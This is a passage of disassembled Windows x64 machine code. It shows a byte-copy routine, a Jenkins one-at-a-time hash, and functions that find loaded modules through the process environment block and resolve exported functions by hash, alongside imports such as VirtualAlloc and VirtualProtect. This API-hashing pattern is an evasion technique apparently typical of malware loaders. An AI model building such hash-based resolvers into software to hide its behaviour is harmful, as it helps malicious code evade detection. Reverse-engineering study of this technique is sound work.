   140001671:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001678:	00 00 00 00 
   14000167c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001680 <_ZN18overly_complicated18complicated_memcpyEPvPKvy>:
   140001680:	56                   	push   %rsi
   140001681:	53                   	push   %rbx
   140001682:	48 83 ec 28          	sub    $0x28,%rsp
   140001686:	48 89 c8             	mov    %rcx,%rax
   140001689:	48 85 c9             	test   %rcx,%rcx
   14000168c:	74 2b                	je     1400016b9 <_ZN18overly_complicated18complicated_memcpyEPvPKvy+0x39>
   14000168e:	48 85 d2             	test   %rdx,%rdx
   140001691:	74 26                	je     1400016b9 <_ZN18overly_complicated18complicated_memcpyEPvPKvy+0x39>
   140001693:	4d 85 c0             	test   %r8,%r8
   140001696:	7e 1a                	jle    1400016b2 <_ZN18overly_complicated18complicated_memcpyEPvPKvy+0x32>
   140001698:	45 31 c9             	xor    %r9d,%r9d
   14000169b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400016a0:	46 0f b6 14 0a       	movzbl (%rdx,%r9,1),%r10d
   1400016a5:	46 88 14 08          	mov    %r10b,(%rax,%r9,1)
   1400016a9:	49 83 c1 01          	add    $0x1,%r9
   1400016ad:	4d 39 c1             	cmp    %r8,%r9
   1400016b0:	75 ee                	jne    1400016a0 <_ZN18overly_complicated18complicated_memcpyEPvPKvy+0x20>
   1400016b2:	48 83 c4 28          	add    $0x28,%rsp
   1400016b6:	5b                   	pop    %rbx
   1400016b7:	5e                   	pop    %rsi
   1400016b8:	c3                   	ret
   1400016b9:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400016be:	e8 8d 68 02 00       	call   140027f50 <__cxa_allocate_exception>
   1400016c3:	48 8d 15 36 e9 34 00 	lea    0x34e936(%rip),%rdx        # 140350000 <.rdata>
   1400016ca:	48 89 c1             	mov    %rax,%rcx
   1400016cd:	48 89 c3             	mov    %rax,%rbx
   1400016d0:	e8 3b 2c 02 00       	call   140024310 <_ZNSt16invalid_argumentC1EPKc>
   1400016d5:	4c 8d 05 c4 2d 02 00 	lea    0x22dc4(%rip),%r8        # 1400244a0 <_ZNSt16invalid_argumentD1Ev>
   1400016dc:	48 8d 15 fd 28 35 00 	lea    0x3528fd(%rip),%rdx        # 140353fe0 <_ZTISt16invalid_argument>
   1400016e3:	48 89 d9             	mov    %rbx,%rcx
   1400016e6:	e8 a5 6c 02 00       	call   140028390 <__cxa_throw>
   1400016eb:	48 89 c6             	mov    %rax,%rsi
   1400016ee:	48 89 d9             	mov    %rbx,%rcx
   1400016f1:	e8 7a 6b 02 00       	call   140028270 <__cxa_free_exception>
   1400016f6:	48 89 f1             	mov    %rsi,%rcx
   1400016f9:	e8 f2 df 00 00       	call   14000f6f0 <_Unwind_Resume>
   1400016fe:	90                   	nop
   1400016ff:	90                   	nop

0000000140001700 <_Z33HashStringJenkinsOneAtATime32BitAPc>:
   140001700:	53                   	push   %rbx
   140001701:	48 83 ec 20          	sub    $0x20,%rsp
   140001705:	48 89 cb             	mov    %rcx,%rbx
   140001708:	ff 15 4a bf 35 00    	call   *0x35bf4a(%rip)        # 14035d658 <__imp_lstrlenA>
   14000170e:	48 98                	cltq
   140001710:	48 85 c0             	test   %rax,%rax
   140001713:	74 6b                	je     140001780 <_Z33HashStringJenkinsOneAtATime32BitAPc+0x80>
   140001715:	48 89 d9             	mov    %rbx,%rcx
   140001718:	48 01 d8             	add    %rbx,%rax
   14000171b:	31 d2                	xor    %edx,%edx
   14000171d:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001724:	00 00 00 00 
   140001728:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000172f:	00 00 00 00 
   140001733:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000173a:	00 00 00 00 
   14000173e:	66 90                	xchg   %ax,%ax
   140001740:	44 0f be 01          	movsbl (%rcx),%r8d
   140001744:	48 83 c1 01          	add    $0x1,%rcx
   140001748:	41 01 d0             	add    %edx,%r8d
   14000174b:	44 89 c2             	mov    %r8d,%edx
   14000174e:	c1 e2 07             	shl    $0x7,%edx
   140001751:	44 01 c2             	add    %r8d,%edx
   140001754:	41 89 d0             	mov    %edx,%r8d
   140001757:	41 c1 e8 06          	shr    $0x6,%r8d
   14000175b:	44 31 c2             	xor    %r8d,%edx
   14000175e:	48 39 c8             	cmp    %rcx,%rax
   140001761:	75 dd                	jne    140001740 <_Z33HashStringJenkinsOneAtATime32BitAPc+0x40>
   140001763:	8d 04 d2             	lea    (%rdx,%rdx,8),%eax
   140001766:	89 c2                	mov    %eax,%edx
   140001768:	c1 ea 0b             	shr    $0xb,%edx
   14000176b:	31 c2                	xor    %eax,%edx
   14000176d:	89 d0                	mov    %edx,%eax
   14000176f:	c1 e0 0f             	shl    $0xf,%eax
   140001772:	01 d0                	add    %edx,%eax
   140001774:	48 83 c4 20          	add    $0x20,%rsp
   140001778:	5b                   	pop    %rbx
   140001779:	c3                   	ret
   14000177a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001780:	31 c0                	xor    %eax,%eax
   140001782:	48 83 c4 20          	add    $0x20,%rsp
   140001786:	5b                   	pop    %rbx
   140001787:	c3                   	ret
   140001788:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000178f:	00 

0000000140001790 <_Z33HashStringJenkinsOneAtATime32BitWPw>:
   140001790:	53                   	push   %rbx
   140001791:	48 83 ec 20          	sub    $0x20,%rsp
   140001795:	48 89 cb             	mov    %rcx,%rbx
   140001798:	ff 15 c2 be 35 00    	call   *0x35bec2(%rip)        # 14035d660 <__imp_lstrlenW>
   14000179e:	48 98                	cltq
   1400017a0:	48 85 c0             	test   %rax,%rax
   1400017a3:	74 53                	je     1400017f8 <_Z33HashStringJenkinsOneAtATime32BitWPw+0x68>
   1400017a5:	4c 8d 04 43          	lea    (%rbx,%rax,2),%r8
   1400017a9:	48 89 d9             	mov    %rbx,%rcx
   1400017ac:	31 c0                	xor    %eax,%eax
   1400017ae:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400017b5:	00 00 00 00 
   1400017b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400017c0:	0f b7 11             	movzwl (%rcx),%edx
   1400017c3:	48 83 c1 02          	add    $0x2,%rcx
   1400017c7:	01 c2                	add    %eax,%edx
   1400017c9:	89 d0                	mov    %edx,%eax
   1400017cb:	c1 e0 07             	shl    $0x7,%eax
   1400017ce:	01 d0                	add    %edx,%eax
   1400017d0:	89 c2                	mov    %eax,%edx
   1400017d2:	c1 ea 06             	shr    $0x6,%edx
   1400017d5:	31 d0                	xor    %edx,%eax
   1400017d7:	49 39 c8             	cmp    %rcx,%r8
   1400017da:	75 e4                	jne    1400017c0 <_Z33HashStringJenkinsOneAtATime32BitWPw+0x30>
   1400017dc:	8d 04 c0             	lea    (%rax,%rax,8),%eax
   1400017df:	89 c2                	mov    %eax,%edx
   1400017e1:	c1 ea 0b             	shr    $0xb,%edx
   1400017e4:	31 c2                	xor    %eax,%edx
   1400017e6:	89 d0                	mov    %edx,%eax
   1400017e8:	c1 e0 0f             	shl    $0xf,%eax
   1400017eb:	01 d0                	add    %edx,%eax
   1400017ed:	48 83 c4 20          	add    $0x20,%rsp
   1400017f1:	5b                   	pop    %rbx
   1400017f2:	c3                   	ret
   1400017f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400017f8:	31 c0                	xor    %eax,%eax
   1400017fa:	48 83 c4 20          	add    $0x20,%rsp
   1400017fe:	5b                   	pop    %rbx
   1400017ff:	c3                   	ret

0000000140001800 <_Z18GetProcAddressHashP11HINSTANCE__m>:
   140001800:	41 57                	push   %r15
   140001802:	41 56                	push   %r14
   140001804:	41 55                	push   %r13
   140001806:	41 54                	push   %r12
   140001808:	55                   	push   %rbp
   140001809:	57                   	push   %rdi
   14000180a:	56                   	push   %rsi
   14000180b:	53                   	push   %rbx
   14000180c:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
   140001813:	49 89 cf             	mov    %rcx,%r15
   140001816:	41 89 d1             	mov    %edx,%r9d
   140001819:	48 85 c9             	test   %rcx,%rcx
   14000181c:	0f 84 c6 02 00 00    	je     140001ae8 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2e8>
   140001822:	85 d2                	test   %edx,%edx
   140001824:	0f 84 be 02 00 00    	je     140001ae8 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2e8>
   14000182a:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   14000182f:	0f 85 b3 02 00 00    	jne    140001ae8 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2e8>
   140001835:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140001839:	48 01 c8             	add    %rcx,%rax
   14000183c:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001842:	0f 85 a0 02 00 00    	jne    140001ae8 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2e8>
   140001848:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   14000184f:	00 00 
   140001851:	44 8b 80 88 00 00 00 	mov    0x88(%rax),%r8d
   140001858:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000185f:	00 00 
   140001861:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140001868:	00 00 
   14000186a:	4e 8d 24 01          	lea    (%rcx,%r8,1),%r12
   14000186e:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140001875:	00 00 
   140001877:	41 8b 44 24 20       	mov    0x20(%r12),%eax
   14000187c:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140001883:	00 00 
   140001885:	45 8b 54 24 1c       	mov    0x1c(%r12),%r10d
   14000188a:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001891:	00 00 
   140001893:	41 8b 54 24 24       	mov    0x24(%r12),%edx
   140001898:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   14000189f:	00 00 
   1400018a1:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400018a8:	00 00 
   1400018aa:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   1400018b1:	00 00 
   1400018b3:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   1400018ba:	00 00 
   1400018bc:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   1400018c3:	00 00 00 00 00 
   1400018c8:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   1400018cf:	00 00 00 00 00 
   1400018d4:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
   1400018db:	00 00 00 00 00 
   1400018e0:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400018e7:	00 00 00 00 00 
   1400018ec:	48 c7 84 24 a0 00 00 	movq   $0x0,0xa0(%rsp)
   1400018f3:	00 00 00 00 00 
   1400018f8:	48 c7 84 24 a8 00 00 	movq   $0x0,0xa8(%rsp)
   1400018ff:	00 00 00 00 00 
   140001904:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   14000190b:	00 00 00 00 00 
   140001910:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   140001917:	00 00 00 00 00 
   14000191c:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   140001923:	00 00 00 00 00 
   140001928:	48 c7 84 24 c8 00 00 	movq   $0x0,0xc8(%rsp)
   14000192f:	00 00 00 00 00 
   140001934:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   14000193b:	00 00 00 00 00 
   140001940:	48 c7 84 24 d8 00 00 	movq   $0x0,0xd8(%rsp)
   140001947:	00 00 00 00 00 
   14000194c:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   140001953:	00 00 00 00 00 
   140001958:	48 c7 84 24 e8 00 00 	movq   $0x0,0xe8(%rsp)
   14000195f:	00 00 00 00 00 
   140001964:	48 c7 84 24 f0 00 00 	movq   $0x0,0xf0(%rsp)
   14000196b:	00 00 00 00 00 
   140001970:	48 c7 84 24 f8 00 00 	movq   $0x0,0xf8(%rsp)
   140001977:	00 00 00 00 00 
   14000197c:	48 c7 84 24 00 01 00 	movq   $0x0,0x100(%rsp)
   140001983:	00 00 00 00 00 
   140001988:	48 c7 84 24 08 01 00 	movq   $0x0,0x108(%rsp)
   14000198f:	00 00 00 00 00 
   140001994:	48 c7 84 24 10 01 00 	movq   $0x0,0x110(%rsp)
   14000199b:	00 00 00 00 00 
   1400019a0:	41 8b 4c 24 18       	mov    0x18(%r12),%ecx
   1400019a5:	48 c7 84 24 18 01 00 	movq   $0x0,0x118(%rsp)
   1400019ac:	00 00 00 00 00 
   1400019b1:	48 c7 84 24 20 01 00 	movq   $0x0,0x120(%rsp)
   1400019b8:	00 00 00 00 00 
   1400019bd:	48 c7 84 24 28 01 00 	movq   $0x0,0x128(%rsp)
   1400019c4:	00 00 00 00 00 
   1400019c9:	85 c9                	test   %ecx,%ecx
   1400019cb:	0f 84 17 01 00 00    	je     140001ae8 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2e8>
   1400019d1:	45 31 f6             	xor    %r14d,%r14d
   1400019d4:	49 8d 2c 07          	lea    (%r15,%rax,1),%rbp
   1400019d8:	49 8d 04 17          	lea    (%r15,%rdx,1),%rax
   1400019dc:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   1400019e1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400019e6:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   1400019eb:	4d 89 f5             	mov    %r14,%r13
   1400019ee:	48 8b 3d fb bd 35 00 	mov    0x35bdfb(%rip),%rdi        # 14035d7f0 <__imp_strncpy_s>
   1400019f5:	44 89 8c 24 88 01 00 	mov    %r9d,0x188(%rsp)
   1400019fc:	00 
   1400019fd:	48 8b 1d fc bd 35 00 	mov    0x35bdfc(%rip),%rbx        # 14035d800 <__imp_toupper>
   140001a04:	eb 19                	jmp    140001a1f <_Z18GetProcAddressHashP11HINSTANCE__m+0x21f>
   140001a06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001a0d:	00 00 00 
   140001a10:	49 83 c5 01          	add    $0x1,%r13
   140001a14:	45 3b 6c 24 18       	cmp    0x18(%r12),%r13d
   140001a19:	0f 83 c9 00 00 00    	jae    140001ae8 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2e8>
   140001a1f:	42 8b 44 ad 00       	mov    0x0(%rbp,%r13,4),%eax
   140001a24:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   140001a2b:	ba 00 01 00 00       	mov    $0x100,%edx
   140001a30:	48 89 f1             	mov    %rsi,%rcx
   140001a33:	4d 8d 04 07          	lea    (%r15,%rax,1),%r8
   140001a37:	ff d7                	call   *%rdi
   140001a39:	85 c0                	test   %eax,%eax
   140001a3b:	75 d3                	jne    140001a10 <_Z18GetProcAddressHashP11HINSTANCE__m+0x210>
   140001a3d:	0f b6 44 24 30       	movzbl 0x30(%rsp),%eax
   140001a42:	84 c0                	test   %al,%al
   140001a44:	74 1f                	je     140001a65 <_Z18GetProcAddressHashP11HINSTANCE__m+0x265>
   140001a46:	49 89 f6             	mov    %rsi,%r14
   140001a49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001a50:	0f be c8             	movsbl %al,%ecx
   140001a53:	49 83 c6 01          	add    $0x1,%r14
   140001a57:	ff d3                	call   *%rbx
   140001a59:	41 88 46 ff          	mov    %al,-0x1(%r14)
   140001a5d:	41 0f b6 06          	movzbl (%r14),%eax
   140001a61:	84 c0                	test   %al,%al
   140001a63:	75 eb                	jne    140001a50 <_Z18GetProcAddressHashP11HINSTANCE__m+0x250>
   140001a65:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001a6a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001a6f:	42 0f b7 04 68       	movzwl (%rax,%r13,2),%eax
   140001a74:	49 8d 04 87          	lea    (%r15,%rax,4),%rax
   140001a78:	44 8b 34 08          	mov    (%rax,%rcx,1),%r14d
   140001a7c:	48 89 f1             	mov    %rsi,%rcx
   140001a7f:	ff 15 d3 bb 35 00    	call   *0x35bbd3(%rip)        # 14035d658 <__imp_lstrlenA>
   140001a85:	4c 63 c0             	movslq %eax,%r8
   140001a88:	4d 85 c0             	test   %r8,%r8
   140001a8b:	74 83                	je     140001a10 <_Z18GetProcAddressHashP11HINSTANCE__m+0x210>
   140001a8d:	48 89 f1             	mov    %rsi,%rcx
   140001a90:	49 01 f0             	add    %rsi,%r8
   140001a93:	31 c0                	xor    %eax,%eax
   140001a95:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001a9c:	00 00 00 00 
   140001aa0:	0f be 11             	movsbl (%rcx),%edx
   140001aa3:	48 83 c1 01          	add    $0x1,%rcx
   140001aa7:	01 c2                	add    %eax,%edx
   140001aa9:	89 d0                	mov    %edx,%eax
   140001aab:	c1 e0 07             	shl    $0x7,%eax
   140001aae:	01 d0                	add    %edx,%eax
   140001ab0:	89 c2                	mov    %eax,%edx
   140001ab2:	c1 ea 06             	shr    $0x6,%edx
   140001ab5:	31 d0                	xor    %edx,%eax
   140001ab7:	4c 39 c1             	cmp    %r8,%rcx
   140001aba:	75 e4                	jne    140001aa0 <_Z18GetProcAddressHashP11HINSTANCE__m+0x2a0>
   140001abc:	8d 14 c0             	lea    (%rax,%rax,8),%edx
   140001abf:	89 d0                	mov    %edx,%eax
   140001ac1:	c1 e8 0b             	shr    $0xb,%eax
   140001ac4:	31 d0                	xor    %edx,%eax
   140001ac6:	89 c2                	mov    %eax,%edx
   140001ac8:	c1 e2 0f             	shl    $0xf,%edx
   140001acb:	01 d0                	add    %edx,%eax
   140001acd:	39 84 24 88 01 00 00 	cmp    %eax,0x188(%rsp)
   140001ad4:	0f 85 36 ff ff ff    	jne    140001a10 <_Z18GetProcAddressHashP11HINSTANCE__m+0x210>
   140001ada:	45 89 f5             	mov    %r14d,%r13d
   140001add:	4b 8d 04 2f          	lea    (%r15,%r13,1),%rax
   140001ae1:	eb 07                	jmp    140001aea <_Z18GetProcAddressHashP11HINSTANCE__m+0x2ea>
   140001ae3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ae8:	31 c0                	xor    %eax,%eax
   140001aea:	48 81 c4 38 01 00 00 	add    $0x138,%rsp
   140001af1:	5b                   	pop    %rbx
   140001af2:	5e                   	pop    %rsi
   140001af3:	5f                   	pop    %rdi
   140001af4:	5d                   	pop    %rbp
   140001af5:	41 5c                	pop    %r12
   140001af7:	41 5d                	pop    %r13
   140001af9:	41 5e                	pop    %r14
   140001afb:	41 5f                	pop    %r15
   140001afd:	c3                   	ret
   140001afe:	66 90                	xchg   %ax,%ax

0000000140001b00 <_Z19GetModuleHandleHashm>:
   140001b00:	41 57                	push   %r15
   140001b02:	41 56                	push   %r14
   140001b04:	41 55                	push   %r13
   140001b06:	41 54                	push   %r12
   140001b08:	55                   	push   %rbp
   140001b09:	57                   	push   %rdi
   140001b0a:	56                   	push   %rsi
   140001b0b:	53                   	push   %rbx
   140001b0c:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
   140001b13:	41 89 cd             	mov    %ecx,%r13d
   140001b16:	85 c9                	test   %ecx,%ecx
   140001b18:	0f 84 2a 01 00 00    	je     140001c48 <_Z19GetModuleHandleHashm+0x148>
   140001b1e:	b8 60 00 00 00       	mov    $0x60,%eax
   140001b23:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   140001b28:	4c 8b 60 18          	mov    0x18(%rax),%r12
   140001b2c:	4d 8b 7c 24 20       	mov    0x20(%r12),%r15
   140001b31:	49 83 c4 20          	add    $0x20,%r12
   140001b35:	4d 39 fc             	cmp    %r15,%r12
   140001b38:	0f 84 0a 01 00 00    	je     140001c48 <_Z19GetModuleHandleHashm+0x148>
   140001b3e:	48 8b 2d bb bc 35 00 	mov    0x35bcbb(%rip),%rbp        # 14035d800 <__imp_toupper>
   140001b45:	4c 8b 35 0c bb 35 00 	mov    0x35bb0c(%rip),%r14        # 14035d658 <__imp_lstrlenA>
   140001b4c:	eb 1e                	jmp    140001b6c <_Z19GetModuleHandleHashm+0x6c>
   140001b4e:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001b55:	00 00 00 00 
   140001b59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001b60:	4d 8b 3f             	mov    (%r15),%r15
   140001b63:	4d 39 fc             	cmp    %r15,%r12
   140001b66:	0f 84 dc 00 00 00    	je     140001c48 <_Z19GetModuleHandleHashm+0x148>
   140001b6c:	41 0f b7 47 48       	movzwl 0x48(%r15),%eax
   140001b71:	83 e8 01             	sub    $0x1,%eax
   140001b74:	66 3d 02 01          	cmp    $0x102,%ax
   140001b78:	77 e6                	ja     140001b60 <_Z19GetModuleHandleHashm+0x60>
   140001b7a:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   140001b7f:	b9 20 00 00 00       	mov    $0x20,%ecx
   140001b84:	31 c0                	xor    %eax,%eax
   140001b86:	31 db                	xor    %ebx,%ebx
   140001b88:	48 89 f7             	mov    %rsi,%rdi
   140001b8b:	f3 48 ab             	rep stos %rax,(%rdi)
   140001b8e:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   140001b94:	31 ff                	xor    %edi,%edi
   140001b96:	66 41 f7 47 48 fe ff 	testw  $0xfffe,0x48(%r15)
   140001b9d:	75 23                	jne    140001bc2 <_Z19GetModuleHandleHashm+0xc2>
   140001b9f:	eb 30                	jmp    140001bd1 <_Z19GetModuleHandleHashm+0xd1>
   140001ba1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ba8:	ff d5                	call   *%rbp
   140001baa:	88 04 1e             	mov    %al,(%rsi,%rbx,1)
   140001bad:	41 0f b7 47 48       	movzwl 0x48(%r15),%eax
   140001bb2:	48 83 c3 01          	add    $0x1,%rbx
   140001bb6:	48 d1 e8             	shr    $1,%rax
   140001bb9:	48 39 c3             	cmp    %rax,%rbx
   140001bbc:	0f 83 7e 00 00 00    	jae    140001c40 <_Z19GetModuleHandleHashm+0x140>
   140001bc2:	49 8b 47 50          	mov    0x50(%r15),%rax
   140001bc6:	89 df                	mov    %ebx,%edi
   140001bc8:	0f b7 0c 58          	movzwl (%rax,%rbx,2),%ecx
   140001bcc:	66 85 c9             	test   %cx,%cx
   140001bcf:	75 d7                	jne    140001ba8 <_Z19GetModuleHandleHashm+0xa8>
   140001bd1:	c6 44 3c 20 00       	movb   $0x0,0x20(%rsp,%rdi,1)
   140001bd6:	48 89 f1             	mov    %rsi,%rcx
   140001bd9:	41 ff d6             	call   *%r14
   140001bdc:	48 98                	cltq
   140001bde:	48 85 c0             	test   %rax,%rax
   140001be1:	0f 84 79 ff ff ff    	je     140001b60 <_Z19GetModuleHandleHashm+0x60>
   140001be7:	48 89 f7             	mov    %rsi,%rdi
   140001bea:	48 01 f0             	add    %rsi,%rax
   140001bed:	31 d2                	xor    %edx,%edx
   140001bef:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001bf6:	00 00 00 00 
   140001bfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001c00:	0f be 0f             	movsbl (%rdi),%ecx
   140001c03:	48 83 c7 01          	add    $0x1,%rdi
   140001c07:	01 d1                	add    %edx,%ecx
   140001c09:	89 ca                	mov    %ecx,%edx
   140001c0b:	c1 e2 07             	shl    $0x7,%edx
   140001c0e:	01 ca                	add    %ecx,%edx
   140001c10:	89 d1                	mov    %edx,%ecx
   140001c12:	c1 e9 06             	shr    $0x6,%ecx
   140001c15:	31 ca                	xor    %ecx,%edx
   140001c17:	48 39 c7             	cmp    %rax,%rdi
   140001c1a:	75 e4                	jne    140001c00 <_Z19GetModuleHandleHashm+0x100>
   140001c1c:	8d 14 d2             	lea    (%rdx,%rdx,8),%edx
   140001c1f:	89 d0                	mov    %edx,%eax
   140001c21:	c1 e8 0b             	shr    $0xb,%eax
   140001c24:	31 d0                	xor    %edx,%eax
   140001c26:	89 c2                	mov    %eax,%edx
   140001c28:	c1 e2 0f             	shl    $0xf,%edx
   140001c2b:	01 d0                	add    %edx,%eax
   140001c2d:	41 39 c5             	cmp    %eax,%r13d
   140001c30:	0f 85 2a ff ff ff    	jne    140001b60 <_Z19GetModuleHandleHashm+0x60>
   140001c36:	49 8b 47 20          	mov    0x20(%r15),%rax
   140001c3a:	eb 0e                	jmp    140001c4a <_Z19GetModuleHandleHashm+0x14a>
   140001c3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001c40:	83 c7 01             	add    $0x1,%edi
   140001c43:	eb 8c                	jmp    140001bd1 <_Z19GetModuleHandleHashm+0xd1>
   140001c45:	0f 1f 00             	nopl   (%rax)
   140001c48:	31 c0                	xor    %eax,%eax
   140001c4a:	48 81 c4 38 01 00 00 	add    $0x138,%rsp
   140001c51:	5b                   	pop    %rbx
   140001c52:	5e                   	pop    %rsi
   140001c53:	5f                   	pop    %rdi
   140001c54:	5d                   	pop    %rbp
   140001c55:	41 5c                	pop    %r12
   140001c57:	41 5d                	pop    %r13
   140001c59:	41 5e                	pop    %r14
   140001c5b:	41 5f                	pop    %r15
   140001c5d:	c3                   	ret
   140001c5e:	90                   	nop
   140001c5f:	90                   	nop
   140001c60:	90                   	nop
   140001c61:	90                   	nop
   140001c62:	90                   	nop
   140001c63:	90                   	nop
   140001c64:	90                   	nop
   140001c65:	90                   	nop
   140001c66:	90                   	nop
   140001c67:	90                   	nop
   140001c68:	90                   	nop
   140001c69:	90                   	nop
   140001c6a:	90                   	nop
   140001c6b:	90                   	nop
   140001c6c:	90                   	nop
   140001c6d:	90                   	nop
   140001c6e:	90                   	nop
   140001c6f:	90                   	nop
   140001c70:	90                   	nop
   140001c71:	90                   	nop
   140001c72:	90                   	nop
   140001c73:	90                   	nop
   140001c74:	90                   	nop
   140001c75:	90                   	nop
   140001c76:	90                   	nop
   140001c77:	90                   	nop
   140001c78:	90                   	nop
   140001c79:	90                   	nop
   140001c7a:	90                   	nop
   140001c7b:	90                   	nop
   140001c7c:	90                   	nop
   140001c7d:	90                   	nop
   140001c7e:	90                   	nop
   140001c7f:	90                   	nop

0000000140001c80 <lstrlenW>:
   140001c80:	ff 25 da b9 35 00    	jmp    *0x35b9da(%rip)        # 14035d660 <__imp_lstrlenW>
   140001c86:	90                   	nop
   140001c87:	90                   	nop

0000000140001c88 <lstrlenA>:
   140001c88:	ff 25 ca b9 35 00    	jmp    *0x35b9ca(%rip)        # 14035d658 <__imp_lstrlenA>
   140001c8e:	90                   	nop
   140001c8f:	90                   	nop

0000000140001c90 <__C_specific_handler>:
   140001c90:	ff 25 ba b9 35 00    	jmp    *0x35b9ba(%rip)        # 14035d650 <__imp___C_specific_handler>
   140001c96:	90                   	nop
   140001c97:	90                   	nop

0000000140001c98 <VirtualProtect>:
   140001c98:	ff 25 8a b9 35 00    	jmp    *0x35b98a(%rip)        # 14035d628 <__imp_VirtualProtect>
   140001c9e:	90                   	nop
   140001c9f:	90                   	nop

0000000140001ca0 <VirtualFree>:
   140001ca0:	ff 25 7a b9 35 00    	jmp    *0x35b97a(%rip)        # 14035d620 <__imp_VirtualFree>
   140001ca6:	90                   	nop
   140001ca7:	90                   	nop

0000000140001ca8 <VirtualAlloc>:
   140001ca8:	ff 25 6a b9 35 00    	jmp    *0x35b96a(%rip)        # 14035d618 <__imp_VirtualAlloc>
   140001cae:	90                   	nop
   140001caf:	90                   	nop

0000000140001cb0 <Sleep>:
   140001cb0:	ff 25 2a b9 35 00    	jmp    *0x35b92a(%rip)        # 14035d5e0 <__imp_Sleep>
   140001cb6:	90                   	nop
   140001cb7:	90                   	nop

0000000140001cb8 <SetUnhandledExceptionFilter>:
   140001cb8:	ff 25 1a b9 35 00    	jmp    *0x35b91a(%rip)        # 14035d5d8 <__imp_SetUnhandledExceptionFilter>
   140001cbe:	90                   	nop
   140001cbf:	90                   	nop

0000000140001cc0 <GetTickCount>:
   140001cc0:	ff 25 42 b8 35 00    	jmp    *0x35b842(%rip)        # 14035d508 <__imp_GetTickCount>
   140001cc6:	90                   	nop
   140001cc7:	90                   	nop
   140001cc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001ccf:	00 

0000000140001cd0 <.text>:
   140001cd0:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001cd7:	00 00 00 
   140001cda:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001ce1:	00 00 00 
   140001ce4:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001ceb:	00 00 00 
   140001cee:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001cf5:	00 00 00 
   140001cf8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001cff:	00 

0000000140001d00 <d_make_comp>:
   140001d00:	49 89 ca             	mov    %rcx,%r10
   140001d03:	83 fa 50             	cmp    $0x50,%edx
   140001d06:	0f 87 dc 00 00 00    	ja     140001de8 <d_make_comp+0xe8>
   140001d0c:	83 fa 34             	cmp    $0x34,%edx
